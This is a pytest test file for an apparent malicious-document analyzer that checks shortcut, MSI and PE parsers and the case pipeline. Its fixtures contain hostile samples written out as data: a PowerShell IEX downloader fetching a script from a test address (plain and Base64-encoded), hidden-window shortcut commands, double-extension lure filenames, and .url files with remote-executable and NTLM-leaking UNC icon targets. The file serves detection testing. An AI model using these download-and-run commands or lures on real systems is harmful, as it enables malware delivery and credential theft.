"""Shortcut (.lnk/.url) and binary (.msi/.exe) families: parsers, MSI stream-name
decode, end-to-end case analysis and the nested (recursive) path."""

from __future__ import annotations

import sys
import time
import zipfile
from pathlib import Path

import pytest

pylnk3 = pytest.importorskip("pylnk3")
pytest.importorskip("LnkParse3")
pytest.importorskip("olefile")

from fastapi.testclient import TestClient  # noqa: E402

from docutracex.app import create_app  # noqa: E402
from docutracex.config import settings  # noqa: E402
from docutracex.parsers import msi, shortcut  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))


# --- fixtures ----------------------------------------------------------------
@pytest.fixture()
def env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    (tmp_path / "cases").mkdir()
    return tmp_path


@pytest.fixture()
def client(env) -> TestClient:
    return TestClient(create_app())


def _wait(client: TestClient, cid: str) -> None:
    for _ in range(1200):
        if client.get(f"/api/cases/{cid}").json().get("state") in ("completed", "error"):
            return
        time.sleep(0.05)


def _make_lnk(tmp: Path, name: str, args: str, icon: str = "") -> Path:
    p = tmp / name
    pylnk3.for_file(r"C:\Windows\System32\cmd.exe", lnk_name=str(p), arguments=args,
                    work_dir=r"C:\Users\Public", description="x",
                    icon_file=icon or r"C:\Windows\System32\shell32.dll", icon_index=0)
    return p


def _make_msi(tmp: Path, command: str) -> Path:
    from cfb import build_cfb
    strdata = b"CustomActionData\x00" + command.encode() + b"\x00http://198.51.100.9/a.ps1\x00"
    tree = {
        msi.encode_streamname("CustomAction", True): b"\x00" * 8,
        msi.encode_streamname("InstallExecuteSequence", True): b"\x00" * 8,
        msi.encode_streamname("Binary", True): b"\x00" * 8,
        msi.encode_streamname("_StringData", False): strdata,
        msi.encode_streamname("Binary.s", False): b"MZ\x90\x00stub",
    }
    p = tmp / "x.msi"
    p.write_bytes(build_cfb(tree))
    return p


# --- MSI stream-name mangling ------------------------------------------------
def test_msi_streamname_round_trip() -> None:
    for name in ("CustomAction", "InstallExecuteSequence", "Binary", "_StringData",
                 "Property", "Binary.stage1", "a", "AB"):
        dec, is_table = msi.decode_streamname(msi.encode_streamname(name, True))
        assert dec == name and is_table
        dec2, is_table2 = msi.decode_streamname(msi.encode_streamname(name, False))
        assert dec2 == name and not is_table2


# --- shortcut parser ---------------------------------------------------------
def test_lnk_lolbin_and_hidden(tmp_path: Path) -> None:
    p = _make_lnk(tmp_path, "a.lnk", r"/c powershell -w hidden -enc ZWNobw==")
    res = shortcut.analyze(p)
    rules = {f["rule"] for f in res["findings"]}
    assert {"lnk_lolbin_target", "lnk_hidden_window"} <= rules
    assert res["items"][0]["kind"] == "lnk"


def test_lnk_double_extension(tmp_path: Path) -> None:
    p = _make_lnk(tmp_path, "factura.pdf.lnk", r"/c calc.exe")
    res = shortcut.analyze(p)
    assert any(f["rule"] == "shortcut_double_extension" for f in res["findings"])


def test_lnk_command_runs_through_scripting_engine(tmp_path: Path) -> None:
    # A real Base64 IEX downloader in the arguments must light up the PS rules.
    import base64
    ps = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')"
    b64 = base64.b64encode(ps.encode("utf-16-le")).decode()
    p = _make_lnk(tmp_path, "b.lnk", f"/c powershell -nop -w hidden -enc {b64}")
    rules = {f["rule"] for f in shortcut.analyze(p)["findings"]}
    assert "ps_iex" in rules and "ps_download" in rules


def test_url_remote_and_unc_icon(tmp_path: Path) -> None:
    p = tmp_path / "r.url"
    p.write_text("[InternetShortcut]\nURL=file://198.51.100.9/s/p.exe\n"
                 "IconFile=\\\\198.51.100.9\\s\\i.ico\n")
    rules = {f["rule"] for f in shortcut.analyze(p)["findings"]}
    assert {"url_remote_file_target", "url_unc_icon_ntlm", "url_executable_target"} <= rules


def test_url_protocol_handler(tmp_path: Path) -> None:
    p = tmp_path / "s.url"
    p.write_text("[InternetShortcut]\nURL=search-ms:query=x&crumb=location:\\\\198.51.100.9\\s\n")
    assert any(f["rule"] == "url_protocol_handler" for f in shortcut.analyze(p)["findings"])


# --- MSI / PE parser ---------------------------------------------------------
def test_msi_tables_and_strings(tmp_path: Path) -> None:
    p = _make_msi(tmp_path, "powershell -w hidden -Command IEX(New-Object Net.WebClient)."
                            "DownloadString('http://198.51.100.9/a.ps1')")
    res = msi.analyze(p)
    it = res["items"][0]
    assert "CustomAction" in it["tables"] and "Binary" in it["tables"]
    rules = {f["rule"] for f in res["findings"]}
    assert {"msi_custom_action", "msi_embedded_binary", "msi_lolbin_string"} <= rules
    assert "ps_iex" in rules  # the mined command went through the scripting engine


def test_pe_is_categorised_not_unpacked(tmp_path: Path) -> None:
    p = tmp_path / "t.exe"
    p.write_bytes(b"MZ\x90\x00" + b"\x00" * 0x3c + b"\x00\x00\x00\x00")
    res = msi.analyze(p)
    assert res["items"][0]["kind"] == "pe" and res["items"][0]["is_pe"]
    assert any(f["rule"] == "pe_image" for f in res["findings"])


def test_fake_pe_masquerade(tmp_path: Path) -> None:
    p = tmp_path / "t.dll"
    p.write_bytes(b"%PDF-1.7 not really a dll")
    assert any(f["rule"] == "pe_not_pe" for f in msi.analyze(p)["findings"])


# --- end-to-end through the case pipeline ------------------------------------
def test_case_lnk_end_to_end(client: TestClient, tmp_path: Path) -> None:
    p = _make_lnk(tmp_path, "c.lnk", r"/c powershell -w hidden -enc ZWNobw==")
    cid = client.post("/api/cases", files={"file": ("invoice.pdf.lnk", p.read_bytes())}).json()["analysis_id"]
    _wait(client, cid)
    comp = client.get(f"/api/cases/{cid}/components").json()
    assert "shortcut" in comp["modules"]
    sc = comp["modules"]["shortcut"]
    assert sc["items"][0]["kind"] == "lnk"
    rules = {f["rule"] for f in comp["findings"]}
    assert "lnk_lolbin_target" in rules and "shortcut_double_extension" in rules


def test_case_msi_end_to_end(client: TestClient, tmp_path: Path) -> None:
    p = _make_msi(tmp_path, "powershell -w hidden -Command IEX(New-Object Net.WebClient)."
                            "DownloadString('http://198.51.100.9/a.ps1')")
    cid = client.post("/api/cases", files={"file": ("setup.msi", p.read_bytes())}).json()["analysis_id"]
    _wait(client, cid)
    comp = client.get(f"/api/cases/{cid}/components").json()
    assert "msi" in comp["modules"]
    assert "CustomAction" in comp["modules"]["msi"]["items"][0]["tables"]
    assert any(f["rule"] == "msi_custom_action" for f in comp["findings"])


def test_case_exe_keeps_file_record_and_categorises(client: TestClient, tmp_path: Path) -> None:
    exe = b"MZ\x90\x00" + b"\x00" * 60 + b"inert"
    cid = client.post("/api/cases", files={"file": ("tool.exe", exe)}).json()["analysis_id"]
    _wait(client, cid)
    comp = client.get(f"/api/cases/{cid}/components").json()
    # PE keeps the generic file record (hashes/YARA) AND gets the categorisation.
    assert comp["modules"]["file"]["hashes"]["sha256"]
    assert "msi" in comp["modules"] and comp["modules"]["msi"]["items"][0]["kind"] == "pe"
    # A PE must NOT be run through the scripting engine.
    assert "javascript" not in comp["modules"] and "powershell" not in comp["modules"]


def test_nested_shortcut_in_zip(client: TestClient, tmp_path: Path) -> None:
    import base64

    ps = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')"
    b64 = base64.b64encode(ps.encode("utf-16-le")).decode()
    lnk = _make_lnk(tmp_path, "d.pdf.lnk", f"/c powershell -nop -w hidden -enc {b64}")
    url = tmp_path / "e.url"
    url.write_text("[InternetShortcut]\nURL=file://198.51.100.9/s/p.exe\nIconFile=\\\\198.51.100.9\\s\\i.ico\n")
    buf = tmp_path / "bundle.zip"
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("d.pdf.lnk", lnk.read_bytes())
        zf.writestr("e.url", url.read_text())
    cid = client.post("/api/cases", files={"file": ("bundle.zip", buf.read_bytes())}).json()["analysis_id"]
    _wait(client, cid)
    comp = client.get(f"/api/cases/{cid}/components").json()
    assert "nested" in comp["modules"]
    rules = {f["rule"] for f in comp["findings"]}
    # The LNK command was deobfuscated inside the archive and the .url flagged.
    assert "lnk_lolbin_target" in rules and "url_unc_icon_ntlm" in rules
